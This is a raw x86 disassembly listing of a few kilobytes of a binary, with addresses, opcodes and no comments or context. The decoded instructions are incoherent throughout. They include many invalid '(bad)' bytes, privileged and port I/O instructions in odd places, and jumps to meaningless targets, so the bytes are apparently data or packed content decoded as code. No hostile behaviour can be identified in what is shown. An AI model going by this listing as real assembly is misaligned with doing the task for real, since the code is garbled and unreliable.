  431353:	jmp    0xdf925910
  431358:	add    BYTE PTR [ebp-0x77],al
  43135b:	out    dx,al
  43135c:	ins    BYTE PTR es:[edi],dx
  43135d:	inc    ebp
  43135e:	jmp    edi
  431360:	add    DWORD PTR [ebp-0x14],0x7e
  431364:	mov    esi,esi
  431366:	outs   dx,BYTE PTR ds:[esi]
  431367:	inc    esp
  431368:	(bad)  
  431369:	mov    esp,0x8341b68d
  43136e:	mov    DWORD PTR [esi+0x70],eax
  431371:	fcos   
  431373:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  431379:	in     al,dx
  43137a:	jb     0x431301
  43137c:	(bad)  
  43137d:	dec    DWORD PTR [ebx-0x7aba9901]
  431383:	mov    edi,edi
  431385:	fdivr  st,st(7)
  431387:	out    dx,eax
  431388:	rcl    BYTE PTR [ebx],0x66
  43138b:	mov    DWORD PTR [ebp-0xc70075],eax
  431391:	(bad)  
  431392:	std    
  431393:	cmp    eax,DWORD PTR [eax]
  431395:	jne    0x4313fd
  431397:	mov    DWORD PTR [ebp-0xba0048],eax
  43139d:	in     al,dx
  43139e:	outs   dx,BYTE PTR ds:[esi]
  43139f:	pushf  
  4313a0:	add    BYTE PTR [ebx-0x7f7a039a],cl
  4313a6:	inc    DWORD PTR [ecx]
  4313a8:	inc    DWORD PTR [eax]
  4313aa:	jae    0x4313e4
  4313ac:	add    BYTE PTR [ebp+0x850266],al
  4313b2:	inc    DWORD PTR [ebp-0x1]
  4313b5:	mov    eax,eax
  4313b7:	jl     0x43141f
  4313b9:	add    BYTE PTR [ebp-0x740077],al
  4313bf:	cld    
  4313c0:	dec    eax
  4313c1:	add    BYTE PTR [eax],0x1
  4313c4:	data16 add BYTE PTR [ebp+0x38],al
  4313c8:	mov    eax,0x47c2
  4313cd:	mov    eax,0x824f89
  4313d2:	inc    edi
  4313d3:	mov    DWORD PTR [edx+0x64],ebp
  4313d6:	inc    WORD PTR [ebp-0x75]
  4313da:	(bad)  
  4313db:	data16 rol BYTE PTR [ebp-0x16001a],1
  4313e2:	inc    ebp
  4313e3:	jge    0x4313c4
  4313e5:	add    bh,ah
  4313e7:	lea    ax,[ebp-0x750030]
  4313ee:	add    al,0x46
  4313f1:	jmp    0x40ff:0x8885
  4313f7:	push   DWORD PTR [ebp+0x52]
  4313fa:	lea    eax,[eax]
  4313fc:	shl    BYTE PTR [esi-0x7b],1
  4313ff:	test   esi,edi
  431401:	(bad)  
  431402:	(bad)  
  431403:	inc    DWORD PTR [ebp-0x990140]
  431409:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  43140f:	inc    edi
  431410:	push   ecx
  431411:	xor    ax,WORD PTR [ebp-0x8d0045]
  431418:	add    al,al
  43141a:	ret    
  43141b:	mov    ax,WORD PTR [ebp-0x3f0004]
  431422:	push   eax
  431423:	mov    DWORD PTR [ebp-0x77],0xff98748b
  43142a:	add    BYTE PTR [ebx-0x764f8839],al
  431430:	push   DWORD PTR [esi+0x1]
  431433:	inc    DWORD PTR [eax]
  431435:	mov    eax,0xff99ff
  43143a:	or     BYTE PTR [ecx-0x7a87bb],cl
  431440:	jne    0x4313fa
  431442:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
  43144c:	mov    ecx,0xd74fb8
  431451:	add    cl,al
  431453:	mov    DWORD PTR [ecx-0x3f007784],ecx
  431459:	or     DWORD PTR [ebx+0x558966dc],0x7e
  431460:	(bad)  
  431461:	push   ebp
  431463:	mov    eax,0x8c2789
  431468:	ret    0x6689
  43146b:	adc    BYTE PTR [ebp+0x48],0x8d
  43146f:	add    bh,ah
  431471:	mov    WORD PTR [ebp-0x70],ax
  431475:	(bad)  
  431476:	ret    0x667d
  431479:	or     BYTE PTR [ebp-0x77],dl
  43147c:	lea    eax,[ecx+eiz*8-0x6b1276bb]
  431483:	loop   0x43140e
  431485:	(bad)  
  431486:	xchg   esi,eax
  431487:	aam    0xcf
  431489:	out    dx,al
  43148a:	mov    DWORD PTR [esi-0x68],edi
  43148d:	inc    ebp
  43148e:	dec    edx
  43148f:	pop    ecx
  431490:	mov    edx,DWORD PTR [eax]
  431492:	repnz push bp
  431495:	or     BYTE PTR [ebx+0x55106638],0x49
  43149c:	(bad)  
  43149d:	repnz xor eax,0xa0898945
  4314a3:	mov    ah,0x89
  4314a5:	jmp    DWORD PTR [edx+0x66b0418d]
  4314ab:	inc    DWORD PTR [ebp+0x50]
  4314ae:	add    DWORD PTR [ebp-0x5],0xffffffbe
  4314b2:	mov    DWORD PTR [eax],ecx
  4314b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4314b5:	pop    es
  4314b6:	inc    ecx
  4314b7:	(bad)  
  4314b8:	data16 fwait
  4314ba:	inc    ebp
  4314bb:	xor    ah,BYTE PTR [esi+0x3]
  4314be:	dec    ebp
  4314bf:	push   eax
  4314c0:	inc    bp
  4314c2:	jge    0x431447
  4314c4:	mov    esp,DWORD PTR [esi-0x18]
  4314c7:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  4314cd:	add    DWORD PTR [ebx],esi
  4314cf:	add    BYTE PTR [ebx],al
  4314d1:	test   DWORD PTR [ebx],esi
  4314d3:	(bad)  
  4314d4:	inc    WORD PTR [ebp+0x0]
  4314d8:	mov    eax,DWORD PTR [eax]
  4314da:	call   0x8898cc0f
  4314df:	mov    esi,eax
  4314e1:	clc    
  4314e2:	ret    
  4314e3:	rol    cl,0xa
  4314e6:	mov    DWORD PTR ds:0x7c0ec88,esi
  4314ec:	mov    edx,edi
  4314ee:	pushf  
  4314ef:	pop    es
  4314f0:	jmp    FWORD PTR [edx+0x66]
  4314f3:	add    BYTE PTR [ebp-0x990175],al
  4314f9:	inc    ebp
  4314fa:	test   DWORD PTR [ebx-0x2f00f202],eax
  431500:	push   ebp
  431501:	mov    edi,eax
  431503:	mov    dh,BYTE PTR [eax+0x266ff51]
  431509:	push   ebp
  43150a:	add    BYTE PTR [ebx-0x764b0777],al
  431510:	dec    DWORD PTR [esi+0x661851e8]
  431516:	add    BYTE PTR [ebp-0x7b],dl
  431519:	cmp    esi,0xfffffffb
  43151c:	dec    DWORD PTR [ecx+0x51fe9285]
  431522:	jmp    DWORD PTR [esi-0x75]
  431525:	push   ebp
  431526:	hlt    
  431527:	data16 (bad) 
  431529:	dec    ebp
  43152a:	ret    
  43152b:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  431531:	lea    edx,[eax-0x1]
  431534:	jne    0x431507
  431536:	dec    DWORD PTR [ecx-0x2f7a63f8]
  43153c:	dec    BYTE PTR [ecx+0x51559eff]
  431542:	mov    DWORD PTR [esi-0x4c],esp
  431545:	push   ebp
  431546:	jmp    DWORD PTR [esi-0x18]
  431549:	inc    ebp
  43154a:	sbb    BYTE PTR [ebp-0x767ad900],cl
  431550:	(bad)  
  431551:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431552:	inc    eax
  431554:	test   DWORD PTR [esi-0x2],esp
  431557:	inc    ebp
  431558:	dec    DWORD PTR [ebp-0x760bde75]
  43155e:	(bad)  
  43155f:	test   al,0xc3
  431561:	mov    DWORD PTR [ebp-0x769b56],ecx
  431567:	lods   al,BYTE PTR ds:[esi]
  431568:	push   eax
  431569:	inc    ebp
  43156a:	jne    0x43157b
  43156c:	dec    DWORD PTR [ebp+0x8]
  43156f:	mov    ecx,DWORD PTR [ebx]
  431571:	sbb    al,0x0
  431573:	(bad)  
  431574:	mov    eax,0xc14fc3
  431579:	mov    DWORD PTR [ecx-0xbabf64],ecx
  43157f:	movsx  ecx,WORD PTR [ebp+0x4e]
  431583:	xor    eax,DWORD PTR [eax]
  431585:	add    eax,edi
  431587:	xor    ecx,DWORD PTR [ecx-0xbabd9a]
  43158d:	xor    edi,DWORD PTR [eax+0x854f66]
  431593:	dec    BYTE PTR [ecx-0x76bb01]
  431599:	mov    BYTE PTR [ebx-0x76724001],al
  43159f:	pushf  
  4315a0:	inc    esi
  4315a1:	(bad)  
  4315a2:	dec    DWORD PTR [ebp-0x7abe6373]
  4315a8:	sar    esi,0x89
  4315ab:	dec    DWORD PTR [eax+0x0]
  4315ae:	inc    DWORD PTR [eax]
  4315b0:	add    DWORD PTR [ebp-0x2f01cb],0xffffff89
  4315b7:	xlat   BYTE PTR ds:[ebx]
  4315b8:	dec    edx
  4315b9:	add    bh,bh
  4315bb:	mov    DWORD PTR [ebp-0x3e00ac48],ecx
  4315c1:	lea    esp,[esi-0x50]
  4315c4:	(bad)  
  4315c5:	(bad)  
  4315c6:	call   DWORD PTR [eax-0x1]
  4315c9:	inc    ebp
  4315ca:	rdpmc  
  4315cc:	add    BYTE PTR [ebx],al
  4315ce:	push   ax
  4315d0:	lea    eax,[ebp-0x1]
  4315d6:	js     0x4315d7
  4315d8:	add    al,bh
  4315da:	push   bp
  4315dc:	lea    ecx,[ebp-0x7701]
  4315e2:	fmul   DWORD PTR [ebp-0x7a997800]
  4315e8:	(bad)  
  4315e9:	(bad)  
  4315ea:	(bad)  
  4315eb:	(bad)  
  4315ec:	jmp    DWORD PTR [ecx-0x7676ffb3]
  4315f2:	dec    eax
  4315f3:	mov    eax,0x8d8dffff
  4315f8:	mov    al,0xb0
  4315fa:	(bad)  
  4315fb:	call   DWORD PTR [ecx+0x50]
  4315fe:	dec    ebp
  4315ff:	inc    ebp
  431600:	mov    esi,0x7030833
  431605:	push   eax
  431606:	into   
  431607:	test   DWORD PTR [ebx+0x3ff32ff],ebx
  43160d:	call   DWORD PTR [ecx-0x8]
  431610:	lea    edx,[ebp-0x1]
  431613:	jmp    0x761817
  431618:	inc    eax
  431619:	jnp    0x4315a8
  43161b:	add    dh,bh
  43161d:	inc    WORD PTR [ebp-0x8a00b0]
  431624:	mov    edx,eax
  431626:	inc    esp
  431627:	add    bh,bh
  431629:	mov    ecx,DWORD PTR [ecx-0x7a4f9a]
  43162f:	dec    DWORD PTR [ebx-0x7f820301]
  431635:	add    BYTE PTR [ecx],al
  431637:	data16 add BYTE PTR [ebp-0xb30077],al
  43163e:	inc    eax
  431640:	(bad)  
  431641:	dec    si
  431643:	test   edi,edi
  431645:	(bad)  
  431646:	cmp    edi,edi
  431648:	add    ecx,DWORD PTR [edi-0x39]
  43164b:	mov    edx,DWORD PTR [edx+0x66]
  43164e:	inc    DWORD PTR [ebp-0x3d00cb]
  431654:	mov    eax,0x66ff8b5e
  43165a:	jmp    0xb4ff:0xc7ff3895
  431661:	push   ecx
  431662:	inc    DWORD PTR [ebx-0x76ffccbb]
  431668:	call   DWORD PTR [esi-0x1]
  43166b:	dec    DWORD PTR [eax]
  43166d:	mov    ecx,0x805ff
  431672:	inc    ebp
  431673:	mov    DWORD PTR [ebx-0x3f00e3a8],ecx
  431679:	mov    ecx,0x35784
  43167e:	add    BYTE PTR [ecx-0xffa59b],cl
  431684:	inc    ebp
  431685:	mov    ecx,0x9c6131
  43168a:	(bad)  
  43168b:	mov    eax,ebx
  43168d:	pop    esp
  43168e:	test   edi,edi
  431690:	clc    
  431691:	lea    eax,[ebp-0x24]
  431694:	cmp    eax,0xc7fe9c8d
  431699:	push   eax
  43169b:	lea    eax,[ebp+0x45fff8fe]
  4316a1:	mov    esi,DWORD PTR [ecx]
  4316a3:	hlt    
  4316a4:	lahf   
  4316a5:	push   esp
  4316a6:	mov    edx,DWORD PTR [ecx-0x4]
  4316a9:	xor    eax,DWORD PTR [eax+0x7201bb]
  4316af:	add    BYTE PTR [ebp-0x35],al
  4316b2:	mov    ecx,DWORD PTR [ebp-0xb2bf04]
  4316b8:	mov    edx,DWORD PTR [ecx-0x74]
  4316bb:	rol    BYTE PTR [eax],0x8d
  4316be:	mov    eax,DWORD PTR [ebx+ecx*4-0x1]
  4316c2:	nop
  4316c3:	push   ecx
  4316c4:	add    bh,bh
  4316c6:	mov    esp,edi
  4316c8:	in     al,0x85
  4316ca:	jge    0x4316ca
  4316cc:	test   edi,edi
  4316ce:	jne    0x431655
  4316d0:	(bad)  
  4316d1:	(bad)  
  4316d2:	sbb    bh,bh
  4316d4:	push   ebp
  4316d5:	inc    ebp
  4316d6:	call   0xffdc1166
  4316db:	add    BYTE PTR [ebp+0x66],al
  4316de:	mov    edx,DWORD PTR [ebp-0xfc0075]
  4316e4:	cmp    al,0x85
  4316e6:	ud0    eax,DWORD PTR [ebp-0x1]
  4316ea:	test   DWORD PTR [edi+0x74],ecx
  4316ed:	dec    edi
  4316ee:	inc    DWORD PTR [ebp-0x530004]
  4316f4:	dec    DWORD PTR [edi-0x75]
  4316f7:	dec    esi
  4316f8:	cld    
  4316f9:	test   DWORD PTR [eax+0xff01ff],eax
  4316ff:	icebp  
  431700:	add    BYTE PTR [edi-0x3a],cl
  431703:	test   ebx,eax
  431705:	inc    BYTE PTR [ebp-0x1]
  431708:	jne    0x43170a
  43170a:	mov    eax,DWORD PTR [eax]
  43170c:	cld    
  43170d:	xor    BYTE PTR [ecx+0x500155],cl
  431713:	push   ebp
  431714:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43171a:	add    BYTE PTR [ebp+0x35e90f50],al
  431720:	add    al,BYTE PTR [eax]
  431722:	add    BYTE PTR [ebx-0x38fe4f80],al
  431728:	add    ah,ch
  43172a:	or     BYTE PTR [ebp+0x4501f845],dh
  431730:	jmp    0xdf1a26
  431735:	(bad)  
  431736:	nop    ecx
  431739:	test   DWORD PTR [ebp+0x4502f8],eax
  43173f:	xor    ecx,DWORD PTR [ebp-0x64]
  431742:	mov    eax,edi
  431744:	mov    ebx,DWORD PTR [eax+edx*2]
  431747:	add    eax,0x45fef885
  43174c:	dec    DWORD PTR [ebx+0x339445]
  431752:	add    ecx,DWORD PTR [ecx+0x4500f889]
  431758:	dec    DWORD PTR [ebx-0x460f0375]
  43175e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43175f:	add    esi,edi
  431761:	add    bh,bh
  431763:	rdpmc  
  431765:	add    BYTE PTR [ebx],0x1
  431768:	mov    DWORD PTR [eax],eax
  43176a:	add    al,0x45
  43176c:	dec    DWORD PTR [ecx-0x360b3373]
  431772:	dec    DWORD PTR [esi]
  431774:	push   eax
  431775:	jne    0x4317bc
  431777:	mov    esi,DWORD PTR [ebx]
  431779:	cld    
  43177a:	add    esp,ecx
  43177c:	push   eax
  43177d:	inc    DWORD PTR [ebp-0x75]
  431780:	add    eax,0x800e4
  431785:	add    BYTE PTR [ebx-0x7f7403bf],cl
  43178b:	mov    DWORD PTR [ecx],eax
  43178d:	sbb    al,0x0
  43178f:	leave  
  431790:	test   DWORD PTR [edi-0x2],eax
  431793:	jne    0x431794
  431795:	call   0xff44019a
  43179a:	xor    BYTE PTR [ebp+0x4d],al
  43179d:	mov    edi,edi
  43179f:	enter  0x8,0x4d
  4317a3:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  4317a9:	mov    eax,DWORD PTR [eax]
  4317ab:	cld    
  4317ac:	add    DWORD PTR [ecx],ebx
  4317ae:	inc    ebp
  4317af:	dec    ebp
  4317b0:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  4317b6:	inc    eax
  4317b7:	dec    DWORD PTR [ecx-0x270375]
  4317bd:	add    BYTE PTR [ebx-0x39d72701],cl
  4317c3:	xchg   ecx,eax
  4317c4:	ret    
  4317c5:	add    BYTE PTR [ebp-0x830075],al
  4317cb:	add    BYTE PTR [ebp-0x75],al
  4317ce:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  4317d4:	lea    edi,[edi-0xc]
  4317d7:	add    bh,bh
  4317d9:	mov    edx,DWORD PTR [eax-0x7b]
  4317dc:	inc    ebp
  4317dd:	rdpmc  
  4317df:	jne    0x4317e4
  4317e1:	add    BYTE PTR [eax-0x75],dl
  4317e4:	inc    ebp
  4317e5:	clc    
  4317e6:	add    eax,0x400009
  4317eb:	mov    DWORD PTR [ebx-0x7f000304],ecx
  4317f1:	mov    eax,DWORD PTR [ecx]
  4317f3:	in     al,dx
  4317f4:	add    dh,al
  4317f6:	test   ebx,eax
  4317f8:	inc    BYTE PTR [ebp-0xff0001]
  4317fe:	add    BYTE PTR [ebp-0x43],al
  431801:	cmp    esi,0xfffffff8
  431804:	(bad)  
  431805:	push   DWORD PTR [eax]
  431807:	add    BYTE PTR [ebp-0x3a],dl
  43180a:	test   ebx,eax
  43180c:	je     0x431793
  43180e:	mov    edi,edi
  431810:	sbb    al,0xff
  431812:	test   DWORD PTR gs:[eax],eax
  431815:	(bad)  
  431816:	js     0x431817
  431818:	add    BYTE PTR [ebx-0x39b20bdd],cl
  43181e:	sub    eax,ebx
  431820:	mov    ecx,DWORD PTR [ebx-0x55130377]
  431826:	add    eax,DWORD PTR [eax]
  431828:	dec    ebp
  431829:	push   eax
  43182a:	mov    al,BYTE PTR [ebp+0x1]
  43182d:	mov    eax,DWORD PTR [ebp-0x68]
  431830:	mov    eax,DWORD PTR [eax]
  431832:	sbb    bh,al
  431834:	or     ah,dh
  431836:	dec    ebp
  431837:	inc    DWORD PTR [eax+0x4]
  43183a:	push   ecx
  43183b:	add    BYTE PTR [edx-0x1],dh
  43183e:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  431844:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  43184e:	add    ecx,DWORD PTR [ecx-0x1be77477]
  431854:	push   ecx
  431855:	cmp    BYTE PTR [ebx],al
  431857:	inc    ebp
  431858:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  43185e:	(bad)  
  43185f:	(bad)  
  431860:	in     al,0xff
  431862:	add    BYTE PTR [ebp+0x0],al
  431865:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  43186b:	add    al,bh
  43186d:	(bad)  
  43186e:	jmp    0x8d85:0x74b0558d
  431875:	dec    DWORD PTR [eax]
  431877:	call   DWORD PTR [ebp-0x7b]
  43187a:	mov    edi,esi
  43187c:	lock call DWORD PTR [ebp-0x75]
  431880:	mov    esi,esp
  431882:	mov    ah,0xc6
  431884:	mov    bh,0xc3
  431886:	mov    DWORD PTR [ebx-0x110003c4],ecx
  43188c:	add    DWORD PTR [eax],0x450050ff
  431892:	mov    DWORD PTR [ebx+0x9598cc],ecx
  431898:	inc    edi
  43189a:	push   esp
  43189c:	jmp    0xcd00:0x650481ff
  4318a3:	mov    DWORD PTR [ebx],esi
  4318a5:	clc    
  4318a6:	cmp    edi,0xff9cff3c
  4318ac:	jne    0x4318b6
  4318ae:	mov    eax,eax
  4318b0:	add    esi,DWORD PTR [eax]
  4318b2:	int3   
  4318b3:	inc    ebp
  4318b4:	cmp    al,0x83
  4318b6:	add    BYTE PTR [eax],bl
  4318b8:	adc    DWORD PTR [ebx+0x768b5055],eax
  4318be:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  4318c4:	mov    edi,eax
  4318c6:	cmp    BYTE PTR [ebp+0x45],cl
  4318c9:	jmp    0x431856
  4318cb:	mov    ebx,DWORD PTR [esp+ebp*8]
  4318ce:	inc    ebp
  4318cf:	or     al,0x2
  4318d1:	dec    DWORD PTR [ebp+0x18]
  4318d4:	jne    0x43192b
  4318d6:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  4318dc:	mov    edi,DWORD PTR [ebx]
  4318de:	in     al,0x50
  4318e0:	xchg   ecx,eax
  4318e1:	jmp    0x34367e6
  4318e6:	adc    al,0x8b
  4318e8:	inc    ebp
  4318e9:	mov    al,ds:0x8b04008b
  4318ee:	push   ebp
  4318ef:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  4318f5:	push   ebp
  4318f6:	test   DWORD PTR [ebx-0x2800d701],ecx
  4318fc:	inc    ebp
  4318fd:	dec    ebp
  4318fe:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  431904:	mov    DWORD PTR [eax],0xe9ff00f4
  43190a:	add    al,0x0
  43190c:	add    BYTE PTR [eax],al
  43190e:	mov    eax,edx
  431910:	push   eax
  431911:	rol    DWORD PTR [ebp-0xf0177],1
  431917:	bound  eax,QWORD PTR [ebp+0x50]
  43191a:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  431920:	add    BYTE PTR [ecx+0x558df0ff],cl
  431926:	mov    al,0xf
  431928:	test   DWORD PTR [edx],edx
  43192a:	call   DWORD PTR [ebp-0x7a0001]
  431930:	(bad)  
  431931:	loop   0x431932
  431933:	jnp    0xc6990d39
  431939:	mov    eax,ebx
  43193b:	cmp    al,0x8b
  43193d:	(bad)  
  43193e:	cld    
  43193f:	shr    esi,0xc
  431942:	add    dl,al
  431944:	push   eax
  431945:	lea    eax,[ebp-0x1]
  431948:	mov    edx,esi
  43194a:	cwde   
  43194b:	cli    
  43194c:	add    BYTE PTR [ebp+0x1ffff8ff],al
  431952:	or     BYTE PTR [eax],cl
  431954:	inc    ebp
  431955:	dec    ebp
  431956:	inc    DWORD PTR [ebx+0x74803914]
  43195c:	add    DWORD PTR [ebx+0x451800],ecx
  431962:	call   DWORD PTR [eax+edx*1]
  431965:	add    ecx,DWORD PTR [ebp-0x34]
  431968:	push   edi
  431969:	adc    al,0x8
  43196b:	mov    edx,DWORD PTR [ebp-0x14]
  43196e:	mov    ecx,DWORD PTR [ebp+0x18]
  431971:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  431975:	inc    DWORD PTR [eax+esi*8]
  431978:	inc    ebp
  431979:	stos   BYTE PTR es:[edi],al
  43197a:	mov    edx,DWORD PTR [ebp-0x4]
  43197d:	add    DWORD PTR [ebp-0x1c],eax
  431980:	mov    edx,DWORD PTR [ebp-0x70]
  431983:	cmp    eax,DWORD PTR [eax]
  431985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431986:	mov    eax,DWORD PTR [eax]
  431988:	cld    
  431989:	jae    0x43190b
  43198b:	add    eax,DWORD PTR [ecx]
  43198d:	clc    
  43198e:	add    BYTE PTR [eax+0x30],dl
  431991:	mov    DWORD PTR [ecx],esi
  431993:	clc    
  431994:	pop    ds
  431995:	inc    ebp
  431996:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  43199c:	(bad)  
  43199d:	push   DWORD PTR [edi]
  43199f:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  4319a5:	(bad)  
  4319a6:	jae    0x4319a7
  4319a8:	mov    eax,DWORD PTR [ebp-0x740175]
  4319ae:	sub    eax,DWORD PTR [eax]
  4319b0:	add    eax,DWORD PTR [eax]
  4319b2:	mov    DWORD PTR [ecx+0x5f],eax
  4319b5:	mov    DWORD PTR [ebx-0x4],ebx
  4319b8:	ret    0xff
  4319bb:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  4319c1:	ret    
  4319c2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  4319c8:	add    BYTE PTR [ebp-0x7d],al
  4319cb:	mov    DWORD PTR [eax],eax
  4319cd:	add    al,0x84
  4319cf:	inc    DWORD PTR [ecx]
  4319d1:	lea    eax,[eax]
  4319d3:	hlt    
  4319d4:	sar    bh,cl
  4319d6:	test   BYTE PTR [eax+0x1],dl
  4319d9:	inc    ebp
  4319da:	add    BYTE PTR [ebx],dh
  4319dc:	test   BYTE PTR [ebx],0x84
  4319df:	push   eax
  4319e0:	add    BYTE PTR [ebp+0x0],al
  4319e3:	add    eax,0x86
  4319e8:	add    BYTE PTR [ebx-0x7f7b0340],cl
  4319ee:	add    BYTE PTR [ecx],al
  4319f0:	add    BYTE PTR [eax],al
  4319f2:	mov    esi,0x550030
  4319f7:	mov    ecx,DWORD PTR [edi]
  4319f9:	cld    
  4319fa:	fidiv  DWORD PTR [ebp+0x0]
  4319fd:	mov    edi,DWORD PTR [ecx]
  4319ff:	xor    BYTE PTR [eax+eax*1],0x84
  431a03:	add    eax,DWORD PTR [eax]
  431a05:	sbb    BYTE PTR [eax],al
  431a07:	jne    0x4319ba
  431a09:	mov    eax,DWORD PTR [ecx]
  431a0b:	sbb    BYTE PTR [eax],al
  431a0d:	mov    DWORD PTR [ebp-0x1],esp
  431a10:	add    BYTE PTR [eax+0x30e45ca],bh
  431a16:	ret    0xb7fc
  431a19:	dec    ebp
  431a1a:	or     al,0x89
  431a1c:	dec    ebp
  431a1d:	cld    
  431a1e:	cmovne ecx,DWORD PTR [eax-0x75]
  431a22:	add    edi,esp
  431a24:	seto   BYTE PTR [esi-0x72ffffff]
  431a2b:	inc    ebp
  431a2c:	adc    al,0x8b
  431a2e:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  431a35:	cmp    DWORD PTR [edi+0x72],edx
  431a38:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  431a3e:	gs cmp al,0x0
  431a41:	je     0x431a19
  431a43:	push   eax
  431a44:	sar    BYTE PTR [eax],1
  431a46:	mov    bh,0x3e
  431a48:	push   cs
  431a49:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  431a4f:	add    DWORD PTR [ecx+0x12],ebp
  431a52:	dec    edx
  431a53:	(bad)  
  431a54:	mov    eax,edx
  431a56:	in     al,dx
  431a57:	adc    DWORD PTR [ecx],esi
  431a59:	pop    esi
  431a5a:	inc    ecx
  431a5b:	leave  
  431a5c:	or     DWORD PTR [eax],ebx
  431a5e:	gs push ebp
  431a60:	add    ah,ch
  431a62:	into   
  431a63:	in     al,dx
  431a64:	enter  0xb756,0xf0
  431a68:	push   cs
  431a69:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a73:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a79:	jnp    0x74439f81
  431a7f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a85:	add    BYTE PTR [edi],cl
  431a87:	mov    edi,DWORD PTR [ecx-0x78]
  431a8a:	ltr    WORD PTR [ecx-0x7b]
  431a8e:	dec    DWORD PTR [edi]
  431a90:	clc    
  431a91:	out    0x45,eax
  431a93:	add    BYTE PTR [eax],cl
  431a95:	cmp    ebx,0xffffff8c
  431a98:	jge    0x431a9a
  431a9a:	jb     0x431aac
  431a9c:	je     0x521b1c
  431aa2:	pop    edx
  431aa3:	push   esi
  431aa4:	mov    ecx,DWORD PTR [edi]
  431aa6:	in     al,dx
  431aa7:	rol    DWORD PTR [ebp+0x0],1
  431aaa:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431ab1:	cmp    DWORD PTR [ecx],0xfffffff0
  431ab4:	hlt    
  431ab5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431abb:	(bad)  
  431abd:	push   eax
  431abe:	jns    0xb842ff3c
  431ac4:	lock push cs
  431ac6:	ror    edx,0x3
  431ac9:	test   BYTE PTR [ecx+0x5500e800],cl
  431acf:	dec    eax
  431ad0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431ad4:	(bad)  
  431ad5:	mov    esi,0x7f33ff5f
  431ada:	inc    eax
  431adb:	test   DWORD PTR [edx],eax
  431add:	je     0x431a9f
  431adf:	mov    ecx,ecx
  431ae1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431ae5:	and    eax,DWORD PTR [eax+0xf0103]
  431aeb:	jp     0x431ad9
  431aed:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431af1:	add    edx,DWORD PTR [edi+0x74]
  431af4:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431afa:	add    BYTE PTR [ebp-0x74c48bbb],al
  431b00:	je     0x431a85
  431b02:	cmp    eax,edi
  431b04:	js     0x431b29
  431b06:	add    eax,0xeb0fc003
  431b0b:	jns    0x431a98
  431b0d:	vmread DWORD PTR [ecx+0x45],ebx
  431b11:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431b17:	adc    al,0x8b
  431b19:	jge    0x431b2f
  431b1b:	mov    edi,DWORD PTR [eax-0x4]
  431b1e:	add    edi,DWORD PTR [edi]
  431b20:	or     bh,bh
  431b22:	push   ebp
  431b23:	push   es
  431b24:	mov    DWORD PTR [ebp-0x4],ebx
  431b27:	add    edi,esi
  431b29:	pop    es
  431b2a:	add    esi,DWORD PTR [edi-0x48ccf183]
  431b30:	mov    DWORD PTR [esp+esi*8],ecx
  431b33:	inc    ebp
  431b34:	pop    ebp
  431b35:	xor    DWORD PTR [esi-0x4],0x3b
  431b39:	add    edx,DWORD PTR [ecx+edi*1]
  431b3c:	push   es
  431b3d:	clc    
  431b3e:	mov    bh,0xdb
  431b40:	jp     0x431af9
  431b42:	add    cl,BYTE PTR [esi]
  431b44:	div    DWORD PTR [edi+0x4d8b0c1c]
  431b4a:	test   edi,edi
  431b4c:	je     0x431b42
  431b4e:	mov    eax,ecx
  431b50:	or     BYTE PTR [ebx],al
  431b52:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431b58:	jbe    0x431bcc
  431b5a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431b60:	add    ecx,DWORD PTR [esi]
  431b62:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431b68:	add    eax,DWORD PTR [ebx-0x287af783]
  431b6e:	je     0x431bbd
  431b70:	mov    DWORD PTR [ecx],edi
  431b72:	mov    esi,eax
  431b74:	hlt    
  431b75:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b7c:	jb     0x431b3e
  431b7e:	jmp    0x431b6b
  431b80:	xor    esi,DWORD PTR [ebx]
  431b82:	pop    edi
  431b83:	pop    esi
  431b84:	pop    ebx
  431b85:	ret    
  431b86:	ret    0x8b
  431b89:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b8f:	xor    DWORD PTR [ecx],0xc
  431b92:	pushf  
  431b93:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b99:	rdmsr  
  431b9b:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431ba2:	dec    ebp
  431ba3:	ret    
  431ba4:	mov    edi,DWORD PTR [esi-0x4]
  431ba7:	pop    eax
  431ba8:	dec    ebp
